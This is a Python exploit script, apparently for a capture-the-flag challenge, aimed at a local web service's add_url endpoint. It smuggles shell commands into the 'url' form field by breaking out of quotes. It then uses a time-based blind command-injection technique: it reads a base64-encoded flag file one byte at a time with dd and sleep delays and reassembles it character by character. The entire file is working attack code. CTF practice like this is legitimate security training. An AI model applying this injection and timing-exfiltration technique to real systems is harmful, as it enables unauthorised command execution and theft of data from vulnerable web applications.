import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

def get_char(pos):
    """Extract single character at position"""
    for c in CHARSET:
        cmd = f'c=$(dd if=/tmp/flag.b64 bs=1 count=1 skip={pos-1} 2>/dev/null); [ "$c" = "{c}" ] && sleep 3'
        elapsed, _ = send_payload(cmd, timeout=6)
        if elapsed > 2.5:
            return c
    return '?'

# Extract all 98 characters
print("[*] Starting full flag extraction...")
print("[*] Length: 98 characters")

flag = ['R']  # We already know position 1

start_time = time.time()

for pos in range(2, 99):  # Positions 2 to 98
    c = get_char(pos)
    flag.append(c)
    
    elapsed = time.time() - start_time
    progress = ''.join(flag)
    print(f"    [{pos}/98] Char: '{c}' | Elapsed: {elapsed:.1f}s | Flag: {progress[-20:]}")

print("\n" + "="*70)
encoded = ''.join(flag)
print(f"[+] Encoded flag extracted: {encoded}")
print("="*70)

